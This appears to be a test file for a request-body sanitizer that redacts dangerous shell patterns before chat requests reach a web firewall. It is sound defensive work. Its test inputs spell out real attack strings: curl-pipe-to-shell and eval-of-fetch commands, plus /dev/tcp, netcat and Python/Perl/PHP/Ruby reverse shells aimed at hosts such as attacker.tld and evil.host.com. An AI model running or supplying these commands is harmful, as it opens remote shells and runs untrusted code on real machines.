/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

import { describe, expect, test } from 'bun:test'
import { sanitizeRequestBody } from './sanitize-request-body'

describe('sanitizeRequestBody — positive cases (3.1 pipe-to-shell)', () => {
  test('redacts | sh', () => {
    expect(sanitizeRequestBody('curl https://x.com/i.sh | sh')).toBe('curl https://x.com/i.sh | {{redacted-shell}}')
  })

  test('redacts |sh (no space)', () => {
    expect(sanitizeRequestBody('curl https://x.com/i.sh |sh')).toBe('curl https://x.com/i.sh |{{redacted-shell}}')
  })

  test('redacts |  sh (multi-space)', () => {
    expect(sanitizeRequestBody('curl https://x.com/i.sh |  sh')).toBe('curl https://x.com/i.sh |  {{redacted-shell}}')
  })

  test('redacts |\\tsh (tab)', () => {
    expect(sanitizeRequestBody('curl https://x.com/i.sh |\tsh')).toBe('curl https://x.com/i.sh |\t{{redacted-shell}}')
  })

  test('redacts | bash', () => {
    expect(sanitizeRequestBody('curl https://x.com | bash')).toBe('curl https://x.com | {{redacted-shell}}')
  })

  test('redacts | zsh, | ash, | dash, | ksh, | fish, | tcsh, | csh', () => {
    for (const sh of ['zsh', 'ash', 'dash', 'ksh', 'fish', 'tcsh', 'csh']) {
      expect(sanitizeRequestBody(`curl x | ${sh}`)).toBe('curl x | {{redacted-shell}}')
    }
  })

  // For sudo/path variants the regex captures the prefix as `$1` and preserves
  // it; only the shell name is replaced. Either form (`| sudo sh` or
  // `| sudo {{redacted-shell}}`) defuses the WAF rule, which keys on the
  // shell-name token itself.
  test('redacts | /bin/sh', () => {
    expect(sanitizeRequestBody('curl x | /bin/sh')).toBe('curl x | /bin/{{redacted-shell}}')
  })

  test('redacts | /usr/bin/bash', () => {
    expect(sanitizeRequestBody('curl x | /usr/bin/bash')).toBe('curl x | /usr/bin/{{redacted-shell}}')
  })

  test('redacts | /usr/local/bin/zsh', () => {
    expect(sanitizeRequestBody('curl x | /usr/local/bin/zsh')).toBe('curl x | /usr/local/bin/{{redacted-shell}}')
  })

  test('redacts | sudo sh', () => {
    expect(sanitizeRequestBody('curl x | sudo sh')).toBe('curl x | sudo {{redacted-shell}}')
  })

  test('redacts | sudo bash', () => {
    expect(sanitizeRequestBody('curl x | sudo bash')).toBe('curl x | sudo {{redacted-shell}}')
  })

  test('redacts | sudo /bin/bash', () => {
    expect(sanitizeRequestBody('curl x | sudo /bin/bash')).toBe('curl x | sudo /bin/{{redacted-shell}}')
  })

  test('case-insensitive: | SH', () => {
    expect(sanitizeRequestBody('curl x | SH')).toBe('curl x | {{redacted-shell}}')
  })
})

describe('sanitizeRequestBody — positive cases (3.2 pipe-to-interpreter)', () => {
  test('redacts | python', () => {
    expect(sanitizeRequestBody('curl x | python')).toBe('curl x | {{redacted-interpreter}}')
  })

  test('redacts | python3', () => {
    expect(sanitizeRequestBody('curl x | python3')).toBe('curl x | {{redacted-interpreter}}')
  })

  test('redacts | python3.12', () => {
    expect(sanitizeRequestBody('curl x | python3.12')).toBe('curl x | {{redacted-interpreter}}')
  })

  test('redacts | perl, | ruby, | node, | php', () => {
    for (const lang of ['perl', 'ruby', 'node', 'php']) {
      expect(sanitizeRequestBody(`curl x | ${lang}`)).toBe('curl x | {{redacted-interpreter}}')
    }
  })

  test('redacts | /usr/bin/python3', () => {
    expect(sanitizeRequestBody('curl x | /usr/bin/python3')).toBe('curl x | /usr/bin/{{redacted-interpreter}}')
  })

  test('redacts | sudo python', () => {
    expect(sanitizeRequestBody('curl x | sudo python')).toBe('curl x | sudo {{redacted-interpreter}}')
  })
})

describe('sanitizeRequestBody — positive cases (3.3 process substitution)', () => {
  test('redacts bash <(curl ...)', () => {
    expect(sanitizeRequestBody('bash <(curl https://x.com/install.sh)')).toBe('bash <({{redacted-network-fetch}})')
  })

  test('redacts sh <(curl ...)', () => {
    expect(sanitizeRequestBody('sh <(curl https://x.com/install.sh)')).toBe('sh <({{redacted-network-fetch}})')
  })

  test('redacts source <(curl ...)', () => {
    expect(sanitizeRequestBody('source <(curl https://x.com/setup.sh)')).toBe('source <({{redacted-network-fetch}})')
  })

  test('redacts . <(curl ...)', () => {
    expect(sanitizeRequestBody('. <(curl https://x.com/setup.sh)')).toBe('. <({{redacted-network-fetch}})')
  })

  test('redacts <(wget ...)', () => {
    expect(sanitizeRequestBody('bash <(wget -O- https://x.com/install.sh)')).toBe('bash <({{redacted-network-fetch}})')
  })
})

describe('sanitizeRequestBody — positive cases (3.5 eval)', () => {
  test('redacts eval $(curl ...)', () => {
    expect(sanitizeRequestBody('eval $(curl https://x.com/i.sh)')).toBe('eval {{redacted-network-eval}}')
  })

  test('redacts eval $(wget ...)', () => {
    expect(sanitizeRequestBody('eval $(wget -O- https://x.com/i.sh)')).toBe('eval {{redacted-network-eval}}')
  })

  test('does NOT redact eval "$(curl ...)" (quoted form, deferred per spec section 4)', () => {
    const input = 'eval "$(curl https://x.com/i.sh)"'
    expect(sanitizeRequestBody(input)).toBe(input)
  })
})

describe('sanitizeRequestBody — positive cases (3.6 shell -c)', () => {
  test('redacts bash -c $(curl ...)', () => {
    expect(sanitizeRequestBody('bash -c $(curl https://x.com/i.sh)')).toBe('bash -c {{redacted-network-exec}}')
  })

  test('redacts sh -c $(curl ...)', () => {
    expect(sanitizeRequestBody('sh -c $(curl https://x.com/i.sh)')).toBe('sh -c {{redacted-network-exec}}')
  })

  test('redacts /bin/bash -c $(curl ...) (Homebrew style, unquoted)', () => {
    expect(
      sanitizeRequestBody(
        '/bin/bash -c $(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)',
      ),
    ).toBe('/bin/bash -c {{redacted-network-exec}}')
  })

  test('does NOT redact bash -c "$(curl ...)" (quoted form, deferred per spec section 4)', () => {
    const input = 'bash -c "$(curl https://x.com/i.sh)"'
    expect(sanitizeRequestBody(input)).toBe(input)
  })
})

describe('sanitizeRequestBody — positive cases (3.7 reverse shell /dev/tcp)', () => {
  test('redacts bash -i >& /dev/tcp/HOST/PORT', () => {
    expect(sanitizeRequestBody('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')).toBe('{{redacted-reverse-shell}} 0>&1')
  })

  test('redacts sh -i >& /dev/tcp/...', () => {
    expect(sanitizeRequestBody('sh -i >& /dev/tcp/192.168.1.5/9001')).toBe('{{redacted-reverse-shell}}')
  })

  test('redacts standalone >& /dev/tcp/HOST/PORT', () => {
    expect(sanitizeRequestBody('>& /dev/tcp/10.0.0.1/4242')).toBe('{{redacted-reverse-shell}}')
  })
})

describe('sanitizeRequestBody — positive cases (3.8 nc -e reverse shell)', () => {
  test('redacts nc -e /bin/sh', () => {
    expect(sanitizeRequestBody('nc 10.0.0.1 4242 -e /bin/sh')).toBe('{{redacted-reverse-shell}}')
  })

  test('redacts nc -e /bin/bash', () => {
    expect(sanitizeRequestBody('nc -e /bin/bash 10.0.0.1 4242')).toMatch(/^\{\{redacted-reverse-shell\}\}/)
  })

  test('redacts ncat -e /bin/sh', () => {
    expect(sanitizeRequestBody('ncat -e /bin/sh 10.0.0.1 4242')).toMatch(/^\{\{redacted-reverse-shell\}\}/)
  })

  test('redacts nc -e with long argument list (M1 widened backstop)', () => {
    const input = 'nc -v -n -w 5 some.really.long.host.example.com 4242 -e /bin/sh'
    expect(sanitizeRequestBody(input)).toBe('{{redacted-reverse-shell}}')
  })
})

describe('sanitizeRequestBody — positive cases (3.9 language reverse shells)', () => {
  test('redacts python -c "...socket...subprocess..."', () => {
    const input = `python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-python-reverse-shell}}')
  })

  test("redacts python3 -c '...socket...subprocess...'", () => {
    const input = `python3 -c 'import socket,subprocess,os'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-python-reverse-shell}}')
  })

  test('redacts perl -e "...use Socket..."', () => {
    const input = `perl -e "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));"`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-perl-reverse-shell}}')
  })

  test('redacts php -r "...fsockopen..."', () => {
    const input = `php -r '$sock=fsockopen(host,4242);'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-php-reverse-shell}}')
  })

  test('redacts ruby -rsocket -e "..."', () => {
    const input = `ruby -rsocket -e 'exit if fork; c=TCPSocket.new(addr,port); end'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-ruby-reverse-shell}}')
  })

  // Sanity tests using real-world mixed-quote payloads (outer `'`, inner `"`).
  // These are the canonical PentestMonkey/HackTricks reverse-shell forms and
  // are now covered thanks to the split Single/Double quote regex variants —
  // each variant uses only one quote type internally, so mixing the opposite
  // quote inside the construct is fine, while JSON-envelope safety is
  // preserved (a Single regex can't consume a structural JSON `"` because it
  // requires a `'` to close).
  test('paired-quote sanity: python mixed-quote real-world payload redacted', () => {
    const input = `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4242))'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-python-reverse-shell}}')
  })

  test('paired-quote sanity: perl mixed-quote real-world payload redacted', () => {
    const input = `perl -e 'use Socket; $i="10.0.0.1"; $p=4242;'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-perl-reverse-shell}}')
  })

  test('paired-quote sanity: php mixed-quote real-world payload redacted', () => {
    const input = `php -r '$sock=fsockopen("10.0.0.1",4242); exec("/bin/sh -i");'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-php-reverse-shell}}')
  })

  test('paired-quote sanity: ruby mixed-quote real-world payload redacted', () => {
    const input = `ruby -rsocket -e 'exit if fork; c=TCPSocket.new("10.0.0.1",4242)'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-ruby-reverse-shell}}')
  })

  // PentestMonkey/HackTricks-style mixed-quote payloads — locks in coverage
  // of the canonical real-world reverse-shell signatures.
  test('PentestMonkey: python mixed-quote reverse shell redacted', () => {
    const input = `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("attacker.tld",4242)); os.dup2(s.fileno(),0)'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-python-reverse-shell}}')
  })

  test('PentestMonkey: perl mixed-quote reverse shell redacted', () => {
    const input = `perl -e 'use Socket; $i="10.0.0.1"; $p=4242; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-perl-reverse-shell}}')
  })

  test('HackTricks: php mixed-quote reverse shell redacted', () => {
    const input = `php -r '$sock=fsockopen("10.0.0.1",4242); fwrite($sock,"hi");'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-php-reverse-shell}}')
  })

  test('PentestMonkey: ruby mixed-quote reverse shell redacted', () => {
    const input = `ruby -rsocket -e 'exit if fork; c=TCPSocket.new("10.0.0.1",4242); while(cmd=c.gets); end'`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-ruby-reverse-shell}}')
  })

  // Double-quoted variants (less common but valid). Fire on raw text input.
  // In JSON-serialized bodies the leading `\"` blocks the regex (deferred per
  // spec section 4) — these tests just demonstrate raw-text coverage.
  test('redacts python -c "..." (double-quoted variant, no inner single quote)', () => {
    const input = `python -c "import socket,subprocess,os; s=socket.socket()"`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-python-reverse-shell}}')
  })

  test('redacts php -r "..." (double-quoted variant, inner single quotes ok)', () => {
    const input = `php -r "<?php fsockopen('h', 80); ?>"`
    expect(sanitizeRequestBody(input)).toBe('{{redacted-php-reverse-shell}}')
  })
})

describe('sanitizeRequestBody — negative cases (must NOT sanitize)', () => {
  test('newline + capitalized word (\\nCall the API)', () => {
    const input = '\nCall the API'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('HTML entity &copy;', () => {
    const input = 'Copyright &copy; 2024'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('| SELF reference (SELF not in shell list)', () => {
    const input = 'something | SELF reference'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('OData query /api/Books?$expand=Author', () => {
    const input = '/api/Books?$expand=Author'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('email axeluser@email.com', () => {
    const input = 'Contact axeluser@email.com for support'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('words mail, task, function, composer, emacs', () => {
    const input = 'use mail, task, function, composer, emacs'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('Perlaaaaaaaa (perl substring, no -e flag)', () => {
    const input = 'Perlaaaaaaaa is a fun word'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test("Swiss number 10'000", () => {
    const input = "The price is 10'000 CHF"
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('Accept header image/webp,*', () => {
    const input = 'Accept: image/webp,*/*'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('shell name in URL https://github.com/sh-tools/...', () => {
    const input = 'See https://github.com/sh-tools/foo for details'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('markdown citation [Source 5]', () => {
    const input = 'See [Source 5] for details'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('URL containing shell name: https://github.com/sh-/foo', () => {
    const input = 'Check out https://github.com/sh-/foo'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('URL containing shell name: https://example.com/bash.html', () => {
    const input = 'Read https://example.com/bash.html'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('word bashful', () => {
    const input = "Don't be bashful"
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('word zshrc', () => {
    const input = 'Edit your ~/.zshrc file'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('word shell (not at pipe)', () => {
    const input = 'Open a shell prompt'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('word crash', () => {
    const input = 'It might crash the system'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('phrase last week', () => {
    const input = 'I saw this last week'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test("code snippet console.log('hi')", () => {
    const input = "console.log('hi')"
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('bitwise OR const x = a | b', () => {
    const input = 'const x = a | b'
    expect(sanitizeRequestBody(input)).toBe(input)
  })
})

describe('sanitizeRequestBody — boundary cases', () => {
  test('empty string returns empty string', () => {
    expect(sanitizeRequestBody('')).toBe('')
  })

  test('string with no patterns returns identical string', () => {
    const input = 'The quick brown fox jumps over the lazy dog.'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('multi-line content with mixed patterns', () => {
    const input = [
      'First line is just prose.',
      'curl https://x.com/i.sh | sh',
      'Some more prose.',
      'eval $(curl https://y.com/x.sh)',
      'Final line.',
    ].join('\n')
    const output = sanitizeRequestBody(input)
    expect(output).toContain('| {{redacted-shell}}')
    expect(output).toContain('eval {{redacted-network-eval}}')
    expect(output).toContain('First line is just prose.')
    expect(output).toContain('Some more prose.')
    expect(output).toContain('Final line.')
  })

  test('does not redact shell pipe split across lines with backslash continuation (deferred per spec 6.3)', () => {
    const input = 'curl https://example.com/install.sh | \\\n  sh'
    expect(sanitizeRequestBody(input)).toBe(input)
  })
})

describe('sanitizeRequestBody — real-world install scripts', () => {
  test('rustup', () => {
    const input = "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
    expect(sanitizeRequestBody(input)).toBe(
      "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | {{redacted-shell}}",
    )
  })

  test('Homebrew (quoted form is deferred per spec section 4 — passes through unchanged)', () => {
    const input = '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('get.docker.com', () => {
    const input = 'curl -fsSL https://get.docker.com | sh'
    expect(sanitizeRequestBody(input)).toBe('curl -fsSL https://get.docker.com | {{redacted-shell}}')
  })

  test('oh-my-zsh (quoted form is deferred per spec section 4 — passes through unchanged)', () => {
    const input = 'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"'
    expect(sanitizeRequestBody(input)).toBe(input)
  })

  test('deno', () => {
    const input = 'curl -fsSL https://deno.land/install.sh | sh'
    expect(sanitizeRequestBody(input)).toBe('curl -fsSL https://deno.land/install.sh | {{redacted-shell}}')
  })

  test('get-pip', () => {
    const input = 'curl https://bootstrap.pypa.io/get-pip.py | python3'
    expect(sanitizeRequestBody(input)).toBe('curl https://bootstrap.pypa.io/get-pip.py | {{redacted-interpreter}}')
  })
})

describe('sanitizeRequestBody — JSON-body integrity (Cursor-flagged regression)', () => {
  // The sanitizer runs on a JSON-serialized request body string. Several
  // regexes used to consume JSON structural characters (`"`, `}`, `,`) and
  // produce malformed JSON. These tests lock in that the redaction never
  // breaks `JSON.parse` of a Vercel-AI-SDK-shaped body.

  test('3.5 eval $(curl ...) — preserves JSON envelope', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: 'eval $(curl example.com)' }],
    })
    const sanitized = sanitizeRequestBody(body)
    expect(() => JSON.parse(sanitized)).not.toThrow()
    expect(sanitized).toContain('{{redacted-network-eval}}')
  })

  test('3.6 bash -c $(curl ...) — preserves JSON envelope', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: 'bash -c $(curl example.com)' }],
    })
    const sanitized = sanitizeRequestBody(body)
    expect(() => JSON.parse(sanitized)).not.toThrow()
    expect(sanitized).toContain('{{redacted-network-exec}}')
  })

  test('3.7 reverse shell /dev/tcp — preserves JSON envelope (no trailing 0>&1)', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: 'bash -i >& /dev/tcp/10.0.0.1/8080' }],
    })
    const sanitized = sanitizeRequestBody(body)
    expect(() => JSON.parse(sanitized)).not.toThrow()
    expect(sanitized).toContain('{{redacted-reverse-shell}}')
  })

  test('3.1 pipe-to-shell (sanity) — preserves JSON envelope with trailing literal quote', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: 'curl https://example.com/install.sh | sh"' }],
    })
    const sanitized = sanitizeRequestBody(body)
    expect(() => JSON.parse(sanitized)).not.toThrow()
    expect(sanitized).toContain('{{redacted-shell}}')
  })

  // 3.9 family: unmatched `'` in content (e.g. truncated security blog
  // snippets) must NOT consume the JSON structural `"`. The split Single/
  // Double regex variants each use only one quote type internally, so the
  // Single variant requires a `'` to close — an unmatched single quote
  // simply produces no match and the body is unchanged. The Double variant
  // can't fire on JSON-serialized bodies because the value's opening `"`
  // is escaped as `\"` and the leading `\` blocks the regex.
  test('3.9 python -c with unmatched single quote — preserves JSON envelope', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: `python -c 'import socket,subprocess and more text` }],
    })
    const sanitized = sanitizeRequestBody(body)
    expect(() => JSON.parse(sanitized)).not.toThrow()
    expect(sanitized).toBe(body)
  })

  test('3.9 perl -e with unmatched single quote — preserves JSON envelope', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: `perl -e 'use Socket and more text` }],
    })
    const sanitized = sanitizeRequestBody(body)
    expect(() => JSON.parse(sanitized)).not.toThrow()
    expect(sanitized).toBe(body)
  })

  test('3.9 php -r with unmatched single quote — preserves JSON envelope', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: `php -r '$sock=fsockopen and more text` }],
    })
    const sanitized = sanitizeRequestBody(body)
    expect(() => JSON.parse(sanitized)).not.toThrow()
    expect(sanitized).toBe(body)
  })

  test('3.9 ruby -rsocket -e with unmatched single quote — preserves JSON envelope', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: `ruby -rsocket -e 'exit if fork and more text` }],
    })
    const sanitized = sanitizeRequestBody(body)
    expect(() => JSON.parse(sanitized)).not.toThrow()
    expect(sanitized).toBe(body)
  })

  test('reverseShellNc does not fuse adjacent JSON messages across structural boundaries', () => {
    const body = JSON.stringify({
      messages: [
        { role: 'user', content: 'nc was the command' },
        { role: 'user', content: '-e /bin/bash test' },
      ],
    })
    const result = sanitizeRequestBody(body)
    // Must still parse
    const parsed = JSON.parse(result)
    // Must still have exactly two messages — no fusion
    expect(parsed.messages).toHaveLength(2)
    // Neither message should contain the redaction placeholder (the regex must not have matched across the boundary)
    expect(parsed.messages[0].content).toBe('nc was the command')
    expect(parsed.messages[1].content).toBe('-e /bin/bash test')
  })

  test('reverseShellNc still redacts within a single JSON content field', () => {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: 'nc -v -n -w 5 evil.host.com 4242 -e /bin/sh' }],
    })
    const result = sanitizeRequestBody(body)
    const parsed = JSON.parse(result)
    expect(parsed.messages[0].content).toContain('{{redacted-reverse-shell}}')
  })
})
